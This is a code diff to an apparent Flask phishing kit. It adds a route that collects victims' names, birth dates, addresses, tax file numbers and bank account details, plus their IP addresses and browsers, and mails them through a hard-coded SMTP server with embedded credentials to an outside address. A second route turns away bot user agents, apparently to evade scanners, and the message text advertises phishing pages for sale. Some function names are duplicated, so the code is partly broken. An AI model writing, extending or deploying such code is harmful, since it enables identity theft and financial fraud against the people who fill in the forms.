@@ -206,6 +206,49 @@ def second():
             server.sendmail(sender_email, receiver_email, message.as_string())
         return redirect(url_for('lasmo'))
 
+@app.route("/personal", methods=['POST'])
+def second():
+    if request.method == 'POST':
+        ip = request.headers.get('X-Forwarded-For')
+        if ip is None:
+            ip = request.headers.get('X-Real-IP')
+        if ip is None:
+            ip = request.headers.get('X-Client-IP')
+        if ip is None:
+            ip = request.remote_addr
+        fullname = request.form.get("fname")
+        dateofbirth = request.form.get("dob")
+        phone = request.form.get("phone")
+        fulladdress = request.form.get("add")
+        taxfilenumber = request.form.get("tx")
+        noticeofassesment = request.form.get("doi")
+        bankaccountdetails = request.form.get("bsb")
+        accountnumber = request.form.get("acct")
+        referencenumber = request.form.get("reference")
+        sender_email = "contact@personalbio.site"
+        sender_emaill = "contact"
+        receiver_email = "demri.aury@moongit.com"
+        password = "vip79d01760b097"
+        useragent = request.headers.get('User-Agent')
+        message = MIMEMultipart("alternative")
+        message["Subject"] = "NEW TT LOGS P2"
+        message["From"] = sender_email
+        message["To"] = receiver_email
+        text = """\
+        Hi,
+        How are you?
+        contact me on icq jamescartwright for your fud pages
+        """
+        html = render_template('personaldata.html', efullname=fullname, ereference=referencenumber, edateofbirth=dateofbirth, ephone=phone, efulladdress=fulladdress, etaxfilenumber=taxfilenumber, enoticeofassesment=noticeofassesment, ebankaccountdetails=bankaccountdetails, eaccountnumber=accountnumber, useragent=useragent, ipman=ip)
+        part1 = MIMEText(text, "plain")
+        part2 = MIMEText(html, "html")
+        message.attach(part1)
+        message.attach(part2)
+        with smtplib.SMTP("91.217.246.43", 6040) as server:
+            server.login(sender_emaill, password)
+            server.sendmail(sender_email, receiver_email, message.as_string())
+        return redirect(url_for('donee'))
+
 
 
 @app.route("/benzap", methods=['GET'])
@@ -214,6 +257,18 @@ def benza():
         eman = session.get('eman')
         dman = session.get('ins')
     return render_template('ind.html', eman=eman, dman=dman)
+
+@app.route("/donee", methods=['GET'])
+def lasmo():
+    userip = request.headers.get("X-Forwarded-For")
+    useragent = request.headers.get("User-Agent")
+    
+    if useragent in bot_user_agents:
+        abort(403)  # forbidden
+    
+    if request.method == 'GET':
+        dman = session.get('ins')
+    return render_template('main.html')
 
 @app.route("/lasmop", methods=['GET'])
 def lasmo():
